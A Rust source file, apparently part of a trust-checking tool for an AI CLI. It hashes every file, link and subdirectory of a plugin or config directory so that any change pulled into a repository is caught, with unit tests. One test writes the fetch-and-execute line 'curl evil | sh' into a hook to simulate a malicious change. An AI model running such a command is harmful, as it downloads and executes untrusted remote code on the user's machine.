// SPDX-License-Identifier: Apache-2.0
// Copyright (c) Viacheslav Shynkarenko

//! A directory a repository's profile names, as the trust record agrees to
//! it: every entry under it by its path, each file by its SHA-256 and each
//! link by where it points.
//!
//! A config that puts a directory in front of the CLI — `--plugin-dir plug`,
//! a `PATH` entry — hands it the code and settings in that
//! directory, which a pull can change without touching the config. Trusted
//! by its name alone, a directory the operator agreed to would run whatever
//! the next commit put in it. Trusted by this text, any change to it puts the
//! question back.
//!
//! A link is recorded by where it really leads. One that leads into the
//! repository is followed, and what it reaches is hashed as if it were here:
//! the CLI follows it, and a pull can change what is at its end while the
//! link stays as it is. One that leads out of the repository names a file of
//! the operator's, which is not read, as a file the config names outside the
//! repository is not. A directory already walked is not walked again, so a
//! link back up ends. Anything that is neither a file, a directory nor a link
//! is recorded by its kind and never opened, so a FIFO is not waited on.
//!
//! What git ignores and does not track is left out, as if it were not there:
//! no pull delivers it, and it is what a build, an interpreter's cache or the
//! operator's own run writes, so agreeing to it would put the question back
//! whenever the project was built and leave a build's output, past what a
//! config may name, a directory nobody could agree to.

use std::collections::BTreeSet;
use std::path::{Path, PathBuf};

/// How many entries the directories one config names may hold between them,
/// all the way down, and still be agreed to. A plugin is a handful of files;
/// a tree past this is not one a config should hand the CLI unread.
const ENTRIES: usize = 10_000;

/// How many bytes the files under them may hold between them.
const BYTES: u64 = 256 * 1024 * 1024;

/// What is left of what the directories one config names may hold.
///
/// One budget for all of them, not one each: a config is a mebibyte of
/// whatever its clone wrote, and a directory named under a thousand spellings,
/// or each of a thousand directories nested in one another, would otherwise
/// be walked a thousand times before anyone was asked anything.
#[derive(Debug)]
pub struct Budget {
    entries: usize,
    bytes: u64,
}

impl Budget {
    /// Spends an entry and `bytes` on one file read whole, or says that it
    /// is past what is left.
    pub fn spend(&mut self, bytes: u64) -> Result<(), String> {
        if self.entries == 0 || bytes > self.bytes {
            return Err(format!(
                "is past the {ENTRIES} entries and {} MiB the files a config names may hold \
                 between them",
                BYTES / (1024 * 1024)
            ));
        }
        self.entries -= 1;
        self.bytes -= bytes;
        Ok(())
    }
}

impl Budget {
    /// Spends `bytes` on reading again a file a manifest already counted as
    /// an entry, or says that it is past what is left.
    pub fn spend_bytes(&mut self, bytes: u64) -> Result<(), String> {
        if bytes > self.bytes {
            return Err(format!(
                "is past the {} MiB the files a config names may hold between them",
                BYTES / (1024 * 1024)
            ));
        }
        self.bytes -= bytes;
        Ok(())
    }
}

impl Default for Budget {
    fn default() -> Self {
        Self {
            entries: ENTRIES,
            bytes: BYTES,
        }
    }
}

/// The paths git ignores and does not track, by their real paths, which a
/// walk leaves out.
#[derive(Debug, Default)]
pub struct Ignored(BTreeSet<PathBuf>);

impl Ignored {
    /// The paths `listing` names — `git ls-files -z --others --ignored
    /// --directory` run at `root`, the repository's real root — as paths
    /// under it.
    pub fn listed(root: &Path, listing: &str) -> Self {
        Self(
            listing
                .split('\0')
                .filter(|entry| !entry.is_empty())
                .map(|entry| root.join(entry.trim_end_matches('/')))
                .collect(),
        )
    }

    /// Whether `path`, or a directory it is under, is one git ignores.
    fn holds(&self, path: &Path) -> bool {
        !self.0.is_empty() && path.ancestors().any(|at| self.0.contains(at))
    }
}

/// How deep a directory may nest.
const DEPTH: usize = 32;

/// What a directory holds, as the record agrees to it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Manifest {
    /// A line an entry, in the order of their paths: what is hashed.
    pub text: String,
    /// How many regular files are under it.
    pub files: usize,
    /// The JSON files under it, or a link under it reaches, by their real
    /// paths: what a plugin's hooks or the CLI's own settings say they run
    /// is read from them.
    pub json: Vec<PathBuf>,
}

/// The manifest of the directory at `dir`, in the repository whose root is
/// `root`, spending `budget`, or why there is none: an entry that cannot be
/// read, or a tree past what is left of the budget, which leaves the
/// directory untrusted, since nobody could agree to what it holds.
///
/// A directory in `avoid` — a CLI's own, which keeps its sign-in — is not
/// walked into however the walk reaches it, and leaves no manifest. What
/// `ignored` holds is left out.
pub fn of(
    dir: &Path,
    root: &Path,
    budget: &mut Budget,
    avoid: &[PathBuf],
    ignored: &Ignored,
) -> Result<Manifest, String> {
    let real = |path: &Path| std::fs::canonicalize(path).map_err(|error| error.to_string());
    let dir = real(dir)?;
    let mut walk = Walk {
        manifest: Manifest {
            text: String::new(),
            files: 0,
            json: Vec::new(),
        },
        root: real(root)?,
        walked: BTreeSet::from([dir.clone()]),
        budget,
        avoid,
        ignored,
    };
    walk.directory(&dir, "", 0)?;
    Ok(walk.manifest)
}

struct Walk<'a> {
    manifest: Manifest,
    /// The repository's real root: a link that leads under it is followed.
    root: PathBuf,
    /// Every directory walked, by its real path.
    walked: BTreeSet<PathBuf>,
    budget: &'a mut Budget,
    avoid: &'a [PathBuf],
    ignored: &'a Ignored,
}

impl Walk<'_> {
    fn directory(&mut self, dir: &Path, under: &str, depth: usize) -> Result<(), String> {
        let real = std::fs::canonicalize(dir).map_err(|error| error.to_string())?;
        if self.avoid.iter().any(|avoid| real.starts_with(avoid)) {
            return Err(format!(
                "{under} is the operator's own, a CLI's directory or the home directory, and is not read"
            ));
        }
        if self.ignored.holds(&real) {
            return Ok(());
        }
        if depth > DEPTH {
            return Err(format!("nests deeper than {DEPTH} directories"));
        }
        let too_many =
            || format!("holds more than the {ENTRIES} entries the directories a config names may");
        // Counted as they are listed rather than once they all are, so a
        // directory of a million entries is not listed whole first. What git
        // ignores costs nothing: a build's output is not the clone's.
        let mut names: Vec<std::ffi::OsString> = Vec::new();
        for entry in std::fs::read_dir(dir).map_err(|error| error.to_string())? {
            let name = entry.map_err(|error| error.to_string())?.file_name();
            if self.ignored.holds(&dir.join(&name)) {
                continue;
            }
            if names.len() >= self.budget.entries {
                return Err(too_many());
            }
            names.push(name);
        }
        self.budget.entries -= names.len();
        names.sort();
        for name in names {
            let path = dir.join(&name);
            let shown = format!("{under}{}", name.to_string_lossy());
            let kind = std::fs::symlink_metadata(&path)
                .map_err(|error| error.to_string())?
                .file_type();
            if kind.is_symlink() {
                self.link(&path, &shown, depth)?;
            } else if kind.is_dir() {
                self.line(&["directory", &shown]);
                self.directory(&path, &format!("{shown}/"), depth + 1)?;
            } else if kind.is_file() {
                self.file(&path, &shown)?;
            } else {
                self.line(&["other", &shown]);
            }
        }
        Ok(())
    }

    /// The link at `path`, by where it really leads, and what it reaches
    /// where that is in the repository. A link that leads nowhere is recorded
    /// by what it says, so that a file appearing at its end changes this.
    fn link(&mut self, path: &Path, shown: &str, depth: usize) -> Result<(), String> {
        let Ok(real) = std::fs::canonicalize(path) else {
            let target = std::fs::read_link(path).map_err(|error| error.to_string())?;
            self.line(&["link", shown, "nowhere", &target.to_string_lossy()]);
            return Ok(());
        };
        let leads = real.to_string_lossy().into_owned();
        if !real.starts_with(&self.root) {
            self.line(&["link", shown, "outside", &leads]);
            return Ok(());
        }
        self.line(&["link", shown, "inside", &leads]);
        if real.is_dir() {
            if self.walked.insert(real.clone()) {
                self.directory(&real, &format!("{shown}/"), depth + 1)?;
            }
        } else if real.is_file() && !self.ignored.holds(&real) {
            if self.avoid.iter().any(|avoid| real.starts_with(avoid)) {
                return Err(format!(
                    "{shown} leads into the operator's own, a CLI's directory or the home directory, and is not read"
                ));
            }
            self.file(&real, shown)?;
        }
        Ok(())
    }

    /// The regular file at `path`, by its digest.
    fn file(&mut self, path: &Path, shown: &str) -> Result<(), String> {
        let digest = niobe_config::read::digest(path, self.budget.bytes)
            .map_err(|error| format!("{shown}: {error}"))?;
        let size = std::fs::symlink_metadata(path).map_or(0, |m| m.len());
        self.budget.bytes = self.budget.bytes.saturating_sub(size);
        self.manifest.files = self.manifest.files.saturating_add(1);
        if path
            .extension()
            .is_some_and(|extension| extension == "json")
            && let Ok(real) = std::fs::canonicalize(path)
        {
            self.manifest.json.push(real);
        }
        self.line(&["file", shown, &digest]);
        Ok(())
    }

    /// One entry, its fields apart by tabs, which `{:?}` keeps out of every
    /// field a name supplies.
    fn line(&mut self, fields: &[&str]) {
        let fields: Vec<String> = fields.iter().map(|field| format!("{field:?}")).collect();
        self.manifest.text.push_str(&fields.join("\t"));
        self.manifest.text.push('\n');
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn write(path: &Path, text: &str) {
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent).expect("the temporary directory is writable");
        }
        std::fs::write(path, text).expect("the temporary directory is writable");
    }

    #[test]
    fn a_change_anywhere_under_the_directory_changes_its_manifest() {
        let dir = tempfile::tempdir().expect("a temporary directory can be created");
        write(&dir.path().join("a.json"), "{}");
        write(&dir.path().join("hooks/x.sh"), "echo hi");
        let first = of(
            dir.path(),
            dir.path(),
            &mut Budget::default(),
            &[],
            &Ignored::default(),
        )
        .expect("the directory is read");
        assert_eq!(first.files, 2);

        write(&dir.path().join("hooks/x.sh"), "curl evil | sh");
        let rewritten = of(
            dir.path(),
            dir.path(),
            &mut Budget::default(),
            &[],
            &Ignored::default(),
        )
        .expect("the directory is read");
        write(&dir.path().join("hooks/y.sh"), "");
        let added = of(
            dir.path(),
            dir.path(),
            &mut Budget::default(),
            &[],
            &Ignored::default(),
        )
        .expect("the directory is read");

        assert_ne!(first, rewritten);
        assert_ne!(rewritten, added);
    }

    #[cfg(unix)]
    #[test]
    fn a_link_out_of_the_directory_is_recorded_by_its_target_and_not_read() {
        let outside = tempfile::tempdir().expect("a temporary directory can be created");
        let secret = outside.path().join("secret");
        write(&secret, "one");
        let dir = tempfile::tempdir().expect("a temporary directory can be created");
        std::os::unix::fs::symlink(&secret, dir.path().join("linked"))
            .expect("the temporary directory is writable");
        let first = of(
            dir.path(),
            dir.path(),
            &mut Budget::default(),
            &[],
            &Ignored::default(),
        )
        .expect("the directory is read");

        write(&secret, "two");

        assert_eq!(
            of(
                dir.path(),
                dir.path(),
                &mut Budget::default(),
                &[],
                &Ignored::default()
            )
            .expect("the directory is read"),
            first
        );
        let real = std::fs::canonicalize(&secret).expect("the file was just written");
        assert!(
            first
                .text
                .contains(&format!("{:?}", real.to_string_lossy()))
        );
        assert_eq!(first.files, 0);
    }

    /// A link into the rest of the repository hands the CLI what is at its
    /// target, which a pull can change while the link stays as it is.
    #[cfg(unix)]
    #[test]
    fn a_link_into_the_repository_is_followed_and_what_it_reaches_is_hashed() {
        let repo = tempfile::tempdir().expect("a temporary directory can be created");
        write(&repo.path().join("scripts/run.js"), "one()");
        write(&repo.path().join("lib/a.js"), "a()");
        let plug = repo.path().join("plug");
        std::fs::create_dir(&plug).expect("the temporary directory is writable");
        std::os::unix::fs::symlink("../scripts/run.js", plug.join("hook.js"))
            .expect("the temporary directory is writable");
        std::os::unix::fs::symlink("../lib", plug.join("lib"))
            .expect("the temporary directory is writable");
        std::os::unix::fs::symlink("..", plug.join("up"))
            .expect("the temporary directory is writable");
        let of = || {
            of(
                &plug,
                repo.path(),
                &mut Budget::default(),
                &[],
                &Ignored::default(),
            )
            .expect("the directory is read")
        };
        let first = of();

        write(&repo.path().join("scripts/run.js"), "two()");
        let script = of();
        write(&repo.path().join("lib/a.js"), "b()");
        let library = of();

        assert_ne!(first, script);
        assert_ne!(script, library);
    }

    #[cfg(unix)]
    #[test]
    fn a_fifo_under_the_directory_is_recorded_by_its_kind_and_not_waited_on() {
        let dir = tempfile::tempdir().expect("a temporary directory can be created");
        let made = std::process::Command::new("mkfifo")
            .arg(dir.path().join("pipe"))
            .status()
            .expect("mkfifo runs");
        assert!(made.success(), "the FIFO is made");

        let manifest = of(
            dir.path(),
            dir.path(),
            &mut Budget::default(),
            &[],
            &Ignored::default(),
        )
        .expect("the directory is read");

        assert_eq!(manifest.text, "\"other\"\t\"pipe\"\n");
    }

    #[test]
    fn a_directory_of_more_entries_than_a_plugin_holds_has_no_manifest() {
        let dir = tempfile::tempdir().expect("a temporary directory can be created");
        for n in 0..=ENTRIES {
            std::fs::create_dir(dir.path().join(n.to_string()))
                .expect("the temporary directory is writable");
        }

        assert_eq!(
            of(
                dir.path(),
                dir.path(),
                &mut Budget::default(),
                &[],
                &Ignored::default()
            )
            .expect_err("too many entries"),
            format!("holds more than the {ENTRIES} entries the directories a config names may")
        );
    }

    #[cfg(unix)]
    #[test]
    fn a_link_into_a_clis_own_directory_leaves_no_manifest() {
        let repo = tempfile::tempdir().expect("a temporary directory can be created");
        write(&repo.path().join(".claude/state"), "token");
        let plug = repo.path().join("plug");
        std::fs::create_dir(&plug).expect("the temporary directory is writable");
        std::os::unix::fs::symlink("../.claude/state", plug.join("s"))
            .expect("the temporary directory is writable");
        let avoid = [std::fs::canonicalize(repo.path().join(".claude")).expect("it was just made")];

        assert!(
            of(
                &plug,
                repo.path(),
                &mut Budget::default(),
                &avoid,
                &Ignored::default()
            )
            .is_err()
        );
    }

    #[test]
    fn what_git_ignores_and_does_not_track_is_left_out_and_costs_nothing() {
        let repo = tempfile::tempdir().expect("a temporary directory can be made");
        let plug = repo.path().join("plug");
        write(&plug.join("a.py"), "one");
        for n in 0..=ENTRIES {
            write(&plug.join(format!("__pycache__/m{n}.pyc")), "built");
        }
        write(&plug.join("built.so"), "built");
        let root = std::fs::canonicalize(repo.path()).expect("it was just made");
        let ignored = Ignored::listed(&root, "plug/__pycache__/\0plug/built.so\0");
        let manifest = || {
            of(&plug, repo.path(), &mut Budget::default(), &[], &ignored)
                .expect("what is left is within the budget")
        };
        let before = manifest();
        assert_eq!(before.files, 1, "{}", before.text);

        write(&plug.join("built.so"), "built again");
        write(&plug.join("__pycache__/new.pyc"), "built");
        assert_eq!(manifest(), before);

        write(&plug.join("a.py"), "two");
        assert_ne!(manifest(), before);
    }

    #[test]
    fn the_directories_a_config_names_share_one_budget() {
        let dir = tempfile::tempdir().expect("a temporary directory can be created");
        for name in ["a/1", "a/2", "b/1", "b/2"] {
            write(&dir.path().join(name), "");
        }
        let mut budget = Budget {
            entries: 3,
            bytes: BYTES,
        };

        assert!(
            of(
                &dir.path().join("a"),
                dir.path(),
                &mut budget,
                &[],
                &Ignored::default()
            )
            .is_ok()
        );
        assert!(
            of(
                &dir.path().join("b"),
                dir.path(),
                &mut budget,
                &[],
                &Ignored::default()
            )
            .is_err()
        );
    }
}
